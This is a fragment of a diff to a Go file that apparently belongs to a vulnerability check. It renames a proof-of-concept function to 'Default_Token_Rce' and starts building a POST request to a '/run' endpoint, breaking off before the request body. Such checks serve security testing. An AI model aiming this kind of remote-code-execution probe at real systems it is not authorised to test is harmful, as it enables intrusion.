@@ -6,7 +6,7 @@ import (
 	"strings"
 )
 
-func poc(host string) bool {
+func Default_Token_Rce(host string) bool {
 
 	client := &http.Client{}
 	req, err := http.NewRequest("POST", host+"/run", strings.NewReader(`{
